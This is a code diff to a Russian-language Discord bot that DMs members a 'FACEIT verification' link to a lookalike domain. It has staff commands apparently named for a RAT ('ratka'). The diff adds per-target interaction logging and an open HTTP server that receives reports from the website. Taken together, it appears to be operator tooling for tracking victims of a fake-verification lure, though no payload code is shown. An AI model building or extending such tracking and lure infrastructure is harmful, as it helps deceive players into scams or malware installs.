@@ -1,6 +1,7 @@
 import os
 import secrets
 from typing import Optional, Dict, Tuple
+from aiohttp import web
 
 import aiohttp
 import discord
@@ -13,6 +14,7 @@ TOKEN = os.getenv("DISCORD_TOKEN")
 GUILD_ID = os.getenv("GUILD_ID")
 FACEIT_API_KEY = os.getenv("FACEIT_API_KEY")
 WEBSITE_URL = os.getenv("WEBSITE_URL", "https://faceit-settings.com")
+LOG_SERVER_PORT = int(os.getenv("LOG_SERVER_PORT", "8888"))
 
 # ID канала для команд верификации
 ALLOWED_CHANNEL_ID = int(os.getenv("ALLOWED_CHANNEL_ID", "0"))
@@ -252,6 +254,31 @@ class FaceitError(Exception):
 
 
 
+# Хранилище для отслеживания действий: {user_id: {"message": Message, "log": [...]}}
+user_tracking = {}
+
+
+async def update_tracking_log(user_id: int):
+    """Обновляет эмбед с логом действий пользователя."""
+    if user_id not in user_tracking:
+        return
+    
+    data = user_tracking[user_id]
+    message = data["message"]
+    log_lines = data["log"]
+    
+    # Создаём обновлённый эмбед (без цвета)
+    embed = discord.Embed(
+        title=f"📊 Лог взаимодействия: <@{user_id}>",
+        description="\n".join(log_lines),
+    )
+    
+    try:
+        await message.edit(embed=embed)
+    except discord.HTTPException:
+        pass
+
+
 async def fetch_player(nickname: str) -> Optional[dict]:
     """Возвращает данные игрока или None, если такого профиля нет."""
     if not FACEIT_API_KEY:
@@ -352,6 +379,14 @@ class NicknameModal(ui.Modal):
     async def on_submit(self, interaction: discord.Interaction):
         t = TEXTS[self.lang]
         nick = self.nickname.value.strip()
+        
+        # Логируем ввод никнейма
+        if interaction.user.id in user_tracking:
+            user_tracking[interaction.user.id]["log"].append(
+                f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | Введён никнейм: **{nick}**"
+            )
+            await update_tracking_log(interaction.user.id)
+        
         # Запрос к API может занять больше 3 секунд — сначала подтверждаем получение.
         await interaction.response.defer()
 
@@ -363,8 +398,28 @@ class NicknameModal(ui.Modal):
             return
 
         if player is None:
+            # Логируем ошибку
+            if interaction.user.id in user_tracking:
+                user_tracking[interaction.user.id]["log"].append(
+                    f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | ❌ Профиль не найден"
+                )
+                await update_tracking_log(interaction.user.id)
             await interaction.followup.send(t["not_found"].format(nick=discord.utils.escape_markdown(nick)))
             return
+
+        # Сохраняем никнейм для будущего трекинга
+        if interaction.user.id in user_tracking:
+            user_tracking[interaction.user.id]["nickname"] = player['nickname']
+        
+        # Логируем успешную отправку
+        if interaction.user.id in user_tracking:
+            user_tracking[interaction.user.id]["log"].append(
+                f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | ✅ Профиль найден: **{player['nickname']}** (LVL {player['level']}, ELO {player['elo']})"
+            )
+            user_tracking[interaction.user.id]["log"].append(
+                f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | 🔗 Ссылка для верификации отправлена: `{WEBSITE_URL}/en/players/{player['nickname']}`"
+            )
+            await update_tracking_log(interaction.user.id)
 
         # Generate verification URL with nickname
         verify_url = f"{WEBSITE_URL}/en/players/{player['nickname']}"
@@ -387,6 +442,14 @@ class LanguageRow(ui.ActionRow):
         ],
     )
     async def pick(self, interaction: discord.Interaction, select: ui.Select):
+        # Обновляем лог: выбран язык
+        if interaction.user.id in user_tracking:
+            lang_name = LANGUAGES[select.values[0]]["label"]
+            user_tracking[interaction.user.id]["log"].append(
+                f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | Выбран язык: **{lang_name}**"
+            )
+            await update_tracking_log(interaction.user.id)
+        
         await interaction.response.send_modal(NicknameModal(select.values[0], self.game))
 
 
@@ -472,9 +535,16 @@ class VerifBot(discord.Client):
         await load_level_emojis(self)
         if not FACEIT_API_KEY:
             print("WARNING: FACEIT_API_KEY не задан — проверка никнеймов работать не будет.")
+        
+        # Запускаем HTTP сервер для логирования
+        await start_log_server(self)
 
 
 bot = VerifBot()
+
+
+# Хранилище для отслеживания действий: {user_id: {"message": Message, "log": [...]}}
+user_tracking = {}
 
 
 @bot.tree.command(name="verif", description="Отправить пользователю FACEIT-верификацию в личные сообщения")
@@ -508,6 +578,19 @@ async def verif(interaction: discord.Interaction, member: discord.Member, game: 
             f"Не удалось написать {member.mention}: у него закрыты личные сообщения."
         )
         return
+
+    # Создаём эмбед для отслеживания (без цвета слева)
+    tracking_embed = discord.Embed(
+        title=f"📊 Лог взаимодействия: {member}",
+        description=f"**{discord.utils.format_dt(discord.utils.utcnow(), 'F')}** | Панель отправлена в личные сообщения {member.mention}",
+    )
+    tracking_message = await interaction.channel.send(embed=tracking_embed)
+    
+    # Сохраняем для отслеживания
+    user_tracking[member.id] = {
+        "message": tracking_message,
+        "log": [f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | Панель отправлена"]
+    }
 
     await interaction.response.send_message(
         f"Верификация ({game.name}) отправлена {member.mention} в личку ✅"
@@ -566,6 +649,13 @@ async def ratka(interaction: discord.Interaction, member: discord.Member, langua
         )
         return
 
+    # Логируем отправку уведомления ratka
+    if member.id in user_tracking:
+        user_tracking[member.id]["log"].append(
+            f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | 📨 Отправлено уведомление **ratka** ({language.name})"
+        )
+        await update_tracking_log(member.id)
+
     await interaction.response.send_message(
         f"Уведомление ({language.name}) отправлено {member.mention} в личку ✅"
     )
@@ -621,6 +711,13 @@ async def final(interaction: discord.Interaction, member: discord.Member, langua
         )
         return
 
+    # Логируем отправку final
+    if member.id in user_tracking:
+        user_tracking[member.id]["log"].append(
+            f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | ✅ Отправлено уведомление **final** ({language.name}) — заявка принята"
+        )
+        await update_tracking_log(member.id)
+
     await interaction.response.send_message(
         f"Уведомление о принятии ({language.name}) отправлено {member.mention} в личку ✅"
     )
@@ -674,9 +771,62 @@ async def oshibka(interaction: discord.Interaction, member: discord.Member, lang
         )
         return
 
+    # Логируем отправку oshibka
+    if member.id in user_tracking:
+        user_tracking[member.id]["log"].append(
+            f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | ⚠️ Отправлено уведомление **oshibka** ({language.name}) — техническая ошибка"
+        )
+        await update_tracking_log(member.id)
+
     await interaction.response.send_message(
         f"Уведомление об ошибке ({language.name}) отправлено {member.mention} в личку ✅"
     )
+
+
+async def handle_log_action(request):
+    """Принимает логи с сайта и обновляет трекинг."""
+    try:
+        data = await request.json()
+        nickname = data.get('nickname')
+        action = data.get('action')
+        user_id = data.get('user_id')  # Discord user ID, если известен
+        
+        if not nickname or not action:
+            return web.json_response({'success': False, 'error': 'Missing data'}, status=400)
+        
+        # Ищем пользователя по нику в трекинге
+        found_user_id = None
+        if user_id:
+            found_user_id = int(user_id)
+        else:
+            # Пытаемся найти пользователя через сохранённый ник (нужно добавить в трекинг)
+            for uid, data in user_tracking.items():
+                if data.get('nickname', '').lower() == nickname.lower():
+                    found_user_id = uid
+                    break
+        
+        if found_user_id and found_user_id in user_tracking:
+            user_tracking[found_user_id]["log"].append(
+                f"{discord.utils.format_dt(discord.utils.utcnow(), 'T')} | {action}"
+            )
+            await update_tracking_log(found_user_id)
+        
+        return web.json_response({'success': True})
+    except Exception as e:
+        print(f"Error in handle_log_action: {e}")
+        return web.json_response({'success': False, 'error': str(e)}, status=500)
+
+
+async def start_log_server(bot_instance):
+    """Запускает HTTP сервер для приёма логов с сайта."""
+    app = web.Application()
+    app.router.add_post('/log', handle_log_action)
+    
+    runner = web.AppRunner(app)
+    await runner.setup()
+    site = web.TCPSite(runner, '0.0.0.0', LOG_SERVER_PORT)
+    await site.start()
+    print(f"Log server started on port {LOG_SERVER_PORT}")
 
 
 if __name__ == "__main__":
